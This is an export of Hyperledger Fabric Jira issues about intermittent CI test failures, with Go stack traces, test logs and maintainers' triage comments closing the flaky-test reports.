2019-12-05T18:50:36.1897710Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/organization.go:78
2019-12-05T18:50:36.1897792Z         	            	github.com/hyperledger/fabric/common/channelconfig.(*ApplicationOrgConfig).Validate
2019-12-05T18:50:36.1897858Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/applicationorg.go:71
2019-12-05T18:50:36.1897930Z         	            	github.com/hyperledger/fabric/common/channelconfig.NewApplicationOrgConfig
2019-12-05T18:50:36.1898013Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/applicationorg.go:57
2019-12-05T18:50:36.1898961Z         	            	github.com/hyperledger/fabric/common/channelconfig.NewApplicationConfig
2019-12-05T18:50:36.1899034Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/application.go:55
2019-12-05T18:50:36.1899114Z         	            	github.com/hyperledger/fabric/common/channelconfig.NewChannelConfig
2019-12-05T18:50:36.1899179Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/channel.go:101
2019-12-05T18:50:36.1899241Z         	            	github.com/hyperledger/fabric/common/channelconfig.NewBundle
2019-12-05T18:50:36.1899320Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/bundle.go:187
2019-12-05T18:50:36.1899489Z         	            	github.com/hyperledger/fabric/common/channelconfig.NewBundleFromEnvelope
2019-12-05T18:50:36.1899556Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/bundle.go:178
2019-12-05T18:50:36.1899700Z         	            	github.com/hyperledger/fabric/orderer/common/cluster.EndpointconfigFromConfigBlock
2019-12-05T18:50:36.1899767Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/common/cluster/util.go:413
2019-12-05T18:50:36.1899847Z         	            	github.com/hyperledger/fabric/orderer/consensus/etcdraft.EndpointconfigFromSupport
2019-12-05T18:50:36.1899912Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/blockpuller.go:42
2019-12-05T18:50:36.1899977Z         	            	github.com/hyperledger/fabric/orderer/consensus/etcdraft.NewBlockPuller
2019-12-05T18:50:36.1900065Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/blockpuller.go:80
2019-12-05T18:50:36.1900128Z         	            	github.com/hyperledger/fabric/orderer/consensus/etcdraft_test.TestNewBlockPuller
2019-12-05T18:50:36.1900203Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/blockpuller_test.go:151
2019-12-05T18:50:36.1900281Z         	            	testing.tRunner
2019-12-05T18:50:36.1900336Z         	            		/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:909
2019-12-05T18:50:36.1900390Z         	            	runtime.goexit
2019-12-05T18:50:36.1900466Z         	            		/opt/hostedtoolcache/go/1.13.4/x64/src/runtime/asm_amd64.s:1357
2019-12-05T18:50:36.1900529Z         	            	Failed importing key with opts [&{true [OU Role EnrollmentID RevocationHandle]}]
2019-12-05T18:50:36.1900590Z         	            	github.com/hyperledger/fabric/bccsp/sw.(*CSP).KeyImport
2019-12-05T18:50:36.1900677Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/bccsp/sw/impl.go:150
2019-12-05T18:50:36.1900739Z         	            	github.com/hyperledger/fabric/msp.(*idemixmsp).Setup
2019-12-05T18:50:36.1900807Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/msp/idemixmsp.go:100
2019-12-05T18:50:36.1900884Z         	            	github.com/hyperledger/fabric/common/channelconfig.(*MSPConfigHandler).ProposeMSP
2019-12-05T18:50:36.1900949Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/msp.go:75
2019-12-05T18:50:36.1901014Z         	            	github.com/hyperledger/fabric/common/channelconfig.(*OrganizationConfig).validateMSP
2019-12-05T18:50:36.1901095Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/organization.go:85
2019-12-05T18:50:36.1901162Z         	            	github.com/hyperledger/fabric/common/channelconfig.(*OrganizationConfig).Validate
2019-12-05T18:50:36.1901250Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/organization.go:78
2019-12-05T18:50:36.1901315Z         	            	github.com/hyperledger/fabric/common/channelconfig.(*ApplicationOrgConfig).Validate
2019-12-05T18:50:36.1901389Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/applicationorg.go:71
2019-12-05T18:50:36.1901471Z         	            	github.com/hyperledger/fabric/common/channelconfig.NewApplicationOrgConfig
2019-12-05T18:50:36.1901540Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/applicationorg.go:57
2019-12-05T18:50:36.1901608Z         	            	github.com/hyperledger/fabric/common/channelconfig.NewApplicationConfig
2019-12-05T18:50:36.1901689Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/application.go:55
2019-12-05T18:50:36.1901824Z         	            	github.com/hyperledger/fabric/common/channelconfig.NewChannelConfig
2019-12-05T18:50:36.1901892Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/channel.go:101
2019-12-05T18:50:36.1902067Z         	            	github.com/hyperledger/fabric/common/channelconfig.NewBundle
2019-12-05T18:50:36.1902137Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/bundle.go:187
2019-12-05T18:50:36.1902205Z         	            	github.com/hyperledger/fabric/common/channelconfig.NewBundleFromEnvelope
2019-12-05T18:50:36.1902288Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/bundle.go:178
2019-12-05T18:50:36.1902358Z         	            	github.com/hyperledger/fabric/orderer/common/cluster.EndpointconfigFromConfigBlock
2019-12-05T18:50:36.1902441Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/common/cluster/util.go:413
2019-12-05T18:50:36.1902517Z         	            	github.com/hyperledger/fabric/orderer/consensus/etcdraft.EndpointconfigFromSupport
2019-12-05T18:50:36.1902586Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/blockpuller.go:42
2019-12-05T18:50:36.1902895Z         	            	github.com/hyperledger/fabric/orderer/consensus/etcdraft.NewBlockPuller
2019-12-05T18:50:36.1902968Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/blockpuller.go:80
2019-12-05T18:50:36.1903034Z         	            	github.com/hyperledger/fabric/orderer/consensus/etcdraft_test.TestNewBlockPuller
2019-12-05T18:50:36.1903116Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/blockpuller_test.go:151
2019-12-05T18:50:36.1903176Z         	            	testing.tRunner
2019-12-05T18:50:36.1903232Z         	            		/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:909
2019-12-05T18:50:36.1903313Z         	            	runtime.goexit
2019-12-05T18:50:36.1903371Z         	            		/opt/hostedtoolcache/go/1.13.4/x64/src/runtime/asm_amd64.s:1357
2019-12-05T18:50:36.1903429Z         	            	cannot setup idemix msp with invalid public key
2019-12-05T18:50:36.1903511Z         	            	setting up the MSP manager failed
2019-12-05T18:50:36.1903880Z         	            	could not create channel Application sub-group config
2019-12-05T18:50:36.1903946Z         	            	github.com/hyperledger/fabric/common/channelconfig.NewChannelConfig
2019-12-05T18:50:36.1904027Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/channel.go:110
2019-12-05T18:50:36.1904091Z         	            	github.com/hyperledger/fabric/common/channelconfig.NewBundle
2019-12-05T18:50:36.1904155Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/bundle.go:187
2019-12-05T18:50:36.1904243Z         	            	github.com/hyperledger/fabric/common/channelconfig.NewBundleFromEnvelope
2019-12-05T18:50:36.1904305Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/bundle.go:178
2019-12-05T18:50:36.1904377Z         	            	github.com/hyperledger/fabric/orderer/common/cluster.EndpointconfigFromConfigBlock
2019-12-05T18:50:36.1904458Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/common/cluster/util.go:413
2019-12-05T18:50:36.1904521Z         	            	github.com/hyperledger/fabric/orderer/consensus/etcdraft.EndpointconfigFromSupport
2019-12-05T18:50:36.1904601Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/blockpuller.go:42
2019-12-05T18:50:36.1904668Z         	            	github.com/hyperledger/fabric/orderer/consensus/etcdraft.NewBlockPuller
2019-12-05T18:50:36.1904734Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/blockpuller.go:80
2019-12-05T18:50:36.1904935Z         	            	github.com/hyperledger/fabric/orderer/consensus/etcdraft_test.TestNewBlockPuller
2019-12-05T18:50:36.1905004Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/blockpuller_test.go:151
2019-12-05T18:50:36.1905125Z         	            	testing.tRunner
2019-12-05T18:50:36.1905197Z         	            		/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:909
2019-12-05T18:50:36.1905254Z         	            	runtime.goexit
2019-12-05T18:50:36.1905312Z         	            		/opt/hostedtoolcache/go/1.13.4/x64/src/runtime/asm_amd64.s:1357
2019-12-05T18:50:36.1905386Z         	            	initializing channelconfig failed
2019-12-05T18:50:36.1905443Z         	            	github.com/hyperledger/fabric/common/channelconfig.NewBundle
2019-12-05T18:50:36.1905506Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/bundle.go:189
2019-12-05T18:50:36.1905594Z         	            	github.com/hyperledger/fabric/common/channelconfig.NewBundleFromEnvelope
2019-12-05T18:50:36.1905657Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/channelconfig/bundle.go:178
2019-12-05T18:50:36.1905724Z         	            	github.com/hyperledger/fabric/orderer/common/cluster.EndpointconfigFromConfigBlock
2019-12-05T18:50:36.1905806Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/common/cluster/util.go:413
2019-12-05T18:50:36.1905872Z         	            	github.com/hyperledger/fabric/orderer/consensus/etcdraft.EndpointconfigFromSupport
2019-12-05T18:50:36.1905937Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/blockpuller.go:42
2019-12-05T18:50:36.1906016Z         	            	github.com/hyperledger/fabric/orderer/consensus/etcdraft.NewBlockPuller
2019-12-05T18:50:36.1906090Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/blockpuller.go:80
2019-12-05T18:50:36.1906171Z         	            	github.com/hyperledger/fabric/orderer/consensus/etcdraft_test.TestNewBlockPuller
2019-12-05T18:50:36.1906246Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/blockpuller_test.go:151
2019-12-05T18:50:36.1906306Z         	            	testing.tRunner
2019-12-05T18:50:36.1906378Z         	            		/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:909
2019-12-05T18:50:36.1906432Z         	            	runtime.goexit
2019-12-05T18:50:36.1906488Z         	            		/opt/hostedtoolcache/go/1.13.4/x64/src/runtime/asm_amd64.s:1357
2019-12-05T18:50:36.1906561Z         	            	failed extracting bundle from envelope
2019-12-05T18:50:36.1906625Z         	            	github.com/hyperledger/fabric/orderer/common/cluster.EndpointconfigFromConfigBlock
2019-12-05T18:50:36.1906697Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/common/cluster/util.go:415
2019-12-05T18:50:36.1906778Z         	            	github.com/hyperledger/fabric/orderer/consensus/etcdraft.EndpointconfigFromSupport
2019-12-05T18:50:36.1906851Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/blockpuller.go:42
2019-12-05T18:50:36.1906915Z         	            	github.com/hyperledger/fabric/orderer/consensus/etcdraft.NewBlockPuller
2019-12-05T18:50:36.1906994Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/blockpuller.go:80
2019-12-05T18:50:36.1907060Z         	            	github.com/hyperledger/fabric/orderer/consensus/etcdraft_test.TestNewBlockPuller
2019-12-05T18:50:36.1907124Z         	            		/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/blockpuller_test.go:151
2019-12-05T18:50:36.1907199Z         	            	testing.tRunner
2019-12-05T18:50:36.1907323Z         	            		/opt/hostedtoolcache/go/1.13.4/x64/src/testing/testing.go:909
2019-12-05T18:50:36.1907379Z         	            	runtime.goexit
2019-12-05T18:50:36.1907452Z         	            		/opt/hostedtoolcache/go/1.13.4/x64/src/runtime/asm_amd64.s:1357
2019-12-05T18:50:36.1907565Z         	Test:       	TestNewBlockPuller
2019-12-05T18:50:36.1907616Z     blockpuller_test.go:153: 
2019-12-05T18:50:36.1907685Z         	Error Trace:	blockpuller_test.go:153
2019-12-05T18:50:36.1907738Z         	Error:      	Expected value not to be nil.
2019-12-05T18:50:36.1907792Z         	Test:       	TestNewBlockPuller
2019-12-05T18:50:36.1908108Z     --- FAIL: TestNewBlockPuller/Certificate_is_invalid (0.20s)
2019-12-05T18:50:36.1908167Z         blockpuller_test.go:184: 
2019-12-05T18:50:36.1908220Z             	Error Trace:	blockpuller_test.go:184
2019-12-05T18:50:36.1908290Z             	Error:      	Error message not equal:
2019-12-05T18:50:36.1908572Z             	            	expected: ""client certificate isn't in PEM format: \x01\x02\x03""
2019-12-05T18:50:36.1909158Z             	            	actual  : ""failed extracting bundle from envelope: initializing channelconfig failed: could not create channel Application sub-group config: setting up the MSP manager failed: cannot setup idemix msp with invalid public key: Failed importing key with opts [&{true [OU Role EnrollmentID RevocationHandle]}]: invalid issuer public key: zero knowledge proof in public key invalid""
2019-12-05T18:50:36.1909285Z             	Test:       	TestNewBlockPuller/Certificate_is_invalid
{code};;;","19/Mar/20 7:30 AM;sykesm;Piggy-backing on the other issue I just looked at (that was opened on the same day), this looks very suspect. All of the errors that I see imply issues with ""zero knowledge proofs"".  I've never seen failures like these in other flakes and the fact that they're so consistently related to the MSP concerns me.;;;","21/Mar/20 2:02 AM;dereckluo;hit again, logs attached  [^3-20.txt] ;;;","24/Mar/20 10:44 PM;sykesm;[~dereckluo] you have a different issue.

{code}
2020-03-20T16:53:47.0047730Z [91m[1mSummarizing 1 Failure:[0m
2020-03-20T16:53:47.0047896Z 
2020-03-20T16:53:47.0048465Z [91m[1m[Fail] [0m[90mChain [0m[0m3-node Raft cluster [0m[90mwhen 3/3 nodes are running [0m[91m[1m[It] orders envelope on leader [0m
2020-03-20T16:53:47.0049185Z [37m/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:2416[0m
2020-03-20T16:53:47.0049457Z 
2020-03-20T16:53:47.0049797Z [1m[91mRan 104 of 104 Specs in 28.851 seconds[0m
2020-03-20T16:53:47.0050392Z [1m[91mFAIL![0m -- [32m[1m103 Passed[0m | [91m[1m1 Failed[0m | [33m[1m0 Pending[0m | [36m[1m0 Skipped[0m
2020-03-20T16:53:47.0050880Z --- FAIL: TestEtcdraft (28.85s)
{code}

A test failure in the same package is not necessarily the same issue. In the case of the issue [~caod] opened, there were lots of oddities that were completely unrelated to etcdraft - there seemed to be a number of problems with the MSP.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update azp vm image version,FAB-17208,43613,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,rameshthoomu,rameshthoomu,06/Dec/19 4:28 AM,19/Apr/20 1:22 PM,28/Oct/23 3:09 AM,19/Apr/20 1:22 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqrk:5iwr4ra",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),rameshthoomu,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,release-1.4,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,release-2.4,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"06/Dec/19 6:11 AM;rameshthoomu;[https://github.com/hyperledger/fabric-test/pull/18]

https://github.com/hyperledger/fabric-test/pull/19;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent UT failure in orderer/common/server,FAB-17209,43614,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Environment Issue,,caod,caod,06/Dec/19 4:45 AM,19/Mar/20 6:27 AM,28/Oct/23 3:09 AM,19/Mar/20 6:27 AM,,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,ci-flake,,,,,[https://dev.azure.com/Hyperledger/0227bd2c-c4f6-478f-be00-ee519f115180/_apis/build/builds/3174/logs/69],,caod,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Dec/19 4:45 AM;caod;ut-orderer-server.log.zip;https://jira.hyperledger.org/secure/attachment/18006/ut-orderer-server.log.zip",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015vv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Mar/20 6:06 AM;sykesm;This log has many failures and some odd comments...

{code}
2019-12-05T19:30:08.5816196Z --- FAIL: TestDBRequestTimeout (0.37s)
2019-12-05T19:30:08.5816253Z     couchdb_test.go:634: 
2019-12-05T19:30:08.5816305Z         	Error Trace:	couchdb_test.go:634
2019-12-05T19:30:08.5816375Z         	Error:      	An error is expected but got nil.
2019-12-05T19:30:08.5816430Z         	Test:       	TestDBRequestTimeout
2019-12-05T19:30:08.5816492Z         	Messages:   	Error should have been thown while trying to create a couchdb instance with a connection timeout
...
2019-12-05T19:30:08.8721602Z FAIL
2019-12-05T19:30:08.8721812Z coverage: 82.6% of statements
2019-12-05T19:30:08.8721863Z FAIL	github.com/hyperledger/fabric/core/ledger/util/couchdb	30.738s
{code}

{code}
2019-12-05T19:34:49.3732493Z --- FAIL: TestParticipant (0.01s)
2019-12-05T19:34:49.3732769Z     --- FAIL: TestParticipant/Pulled_block's_metadata_is_malformed (0.00s)
2019-12-05T19:34:49.3732825Z         replication_test.go:818: 
2019-12-05T19:34:49.3732969Z             	Error Trace:	replication_test.go:818
2019-12-05T19:34:49.3733036Z             	Error:      	Error message not equal:
2019-12-05T19:34:49.3733097Z             	            	expected: ""error unmarshaling metadata from block at index [LAST_CONFIG]: proto: common.Metadata: illegal tag 0 (wire type 1)""
2019-12-05T19:34:49.3733170Z             	            	actual  : ""failed to get signatures: error unmarshaling metadata from block at index [SIGNATURES]: proto: common.Metadata: illegal tag 0 (wire type 1)""
2019-12-05T19:34:49.3733481Z             	Test:       	TestParticipant/Pulled_block's_metadata_is_malformed
2019-12-05T19:34:49.3733759Z     --- FAIL: TestParticipant/Pulled_block's_metadata_is_valid_and_has_a_last_config (0.00s)
2019-12-05T19:34:49.3733814Z         replication_test.go:821: 
2019-12-05T19:34:49.3733887Z             	Error Trace:	replication_test.go:821
2019-12-05T19:34:49.3733942Z             	Error:      	""%!s(chan *common.Block=0xc00044c720)"" should have 1 item(s), but has 0
2019-12-05T19:34:49.3734234Z             	Test:       	TestParticipant/Pulled_block's_metadata_is_valid_and_has_a_last_config
2019-12-05T19:34:49.3734305Z         replication_test.go:822: 
2019-12-05T19:34:49.3734352Z             	Error Trace:	replication_test.go:822
2019-12-05T19:34:49.3734398Z             	Error:      	Not equal: 
2019-12-05T19:34:49.3734484Z             	            	expected: *errors.withStack(failed to get signatures: error unmarshaling metadata from block at index [SIGNATURES]: proto: common.Metadata: illegal tag 0 (wire type 1))
2019-12-05T19:34:49.3734552Z             	            	actual  : *errors.fundamental(not in the channel)
2019-12-05T19:34:49.3734852Z             	Test:       	TestParticipant/Pulled_block's_metadata_is_valid_and_has_a_last_config
2019-12-05T19:34:49.3735129Z     --- FAIL: TestParticipant/Failed_pulling_last_config_block (0.00s)
2019-12-05T19:34:49.3735185Z         replication_test.go:818: 
2019-12-05T19:34:49.3735248Z             	Error Trace:	replication_test.go:818
2019-12-05T19:34:49.3735305Z             	Error:      	Error message not equal:
2019-12-05T19:34:49.3735355Z             	            	expected: ""retry attempts exhausted""
2019-12-05T19:34:49.3735435Z             	            	actual  : ""failed to get signatures: error unmarshaling metadata from block at index [SIGNATURES]: proto: common.Metadata: illegal tag 0 (wire type 1)""
2019-12-05T19:34:49.3735499Z             	Test:       	TestParticipant/Failed_pulling_last_config_block
...
2019-12-05T19:34:49.3770162Z !!!WTL falling back
2019-12-05T19:34:49.3770360Z !!!WTL falling back
2019-12-05T19:34:49.3770405Z !!!WTL falling back
2019-12-05T19:34:49.3770663Z --- FAIL: TestLastConfigBlock (0.00s)
2019-12-05T19:34:49.3770927Z     --- FAIL: TestLastConfigBlock/bad_metadata_in_block (0.00s)
2019-12-05T19:34:49.3770979Z         util_test.go:951: 
2019-12-05T19:34:49.3771025Z             	Error Trace:	util_test.go:951
2019-12-05T19:34:49.3771088Z             	Error:      	Error message not equal:
2019-12-05T19:34:49.3771150Z             	            	expected: ""error unmarshaling metadata from block at index [LAST_CONFIG]: proto: common.Metadata: illegal tag 0 (wire type 1)""
2019-12-05T19:34:49.3771222Z             	            	actual  : ""failed to get last config: error unmarshaling metadata from block at index [LAST_CONFIG]: proto: common.Metadata: illegal tag 0 (wire type 1)""
2019-12-05T19:34:49.3771308Z             	Test:       	TestLastConfigBlock/bad_metadata_in_block
...
2019-12-05T19:34:49.5111250Z coverage: 95.1% of statements
2019-12-05T19:34:49.5111305Z FAIL	github.com/hyperledger/fabric/orderer/common/cluster	44.825s
{code}

The WTL statements, for example, imply someone was debugging something.;;;","19/Mar/20 6:25 AM;sykesm;So, I don't know that I trust the logs given the debug info that's in them and the mismatched error types getting called out.

Additionally, FAB-15817 / PR #363 made many changes to {{TestParticipant}} after this issue was opened..;;;","19/Mar/20 6:27 AM;sykesm;This package has many issues but I'm not sure we can rely on the information in the attached logs. Closing for now. if we see failures in {{TestParticpant}} in the future, hindsight will tell us that I made the wrong decision.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent IT failure in raft/etcdraft_reconfig_test.go: EndToEnd reconfiguration and onboarding when the orderer certificates are all rotated [It] is still possible to onboard new orderers,FAB-17210,43615,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,caod,caod,06/Dec/19 4:50 AM,24/Mar/20 11:28 PM,28/Oct/23 3:09 AM,24/Mar/20 11:28 PM,,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,ci-flake,,,,,"EndToEnd reconfiguration and onboarding [0m[0mwhen the orderer certificates are all rotated [0m[91m[1m[It] is still possible to onboard new orderers 

[https://dev.azure.com/Hyperledger/0227bd2c-c4f6-478f-be00-ee519f115180/_apis/build/builds/3108/logs/114]",,caod,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Dec/19 4:50 AM;caod;it-etcdraft-reconfig.log.zip;https://jira.hyperledger.org/secure/attachment/18007/it-etcdraft-reconfig.log.zip",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015w3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Mar/20 11:28 PM;sykesm;The chaincode deployment reported by this issue is no longer in the tests. The reconfiguration tests have been extracted from the e2e package and into their own raft suite and many of the tests have been reworked since this was reported.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent IT failure in e2e migration test,FAB-17211,43616,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,caod,caod,06/Dec/19 6:18 AM,19/Mar/20 5:32 AM,28/Oct/23 3:09 AM,19/Mar/20 5:32 AM,,,,,,,,,,,,,,,,,,,,,,,0,ci-flake,,,,,"Possibly related to nwo/configblock flake

 

[https://dev.azure.com/Hyperledger/0227bd2c-c4f6-478f-be00-ee519f115180/_apis/build/builds/3108/logs/123]",,caod,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Dec/19 6:18 AM;caod;it-migration-test.log.zip;https://jira.hyperledger.org/secure/attachment/18008/it-migration-test.log.zip",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i015wb:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Mar/20 5:32 AM;denyeart;No recurrence noted in 2020 so far, please re-open if a recurrence is found.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
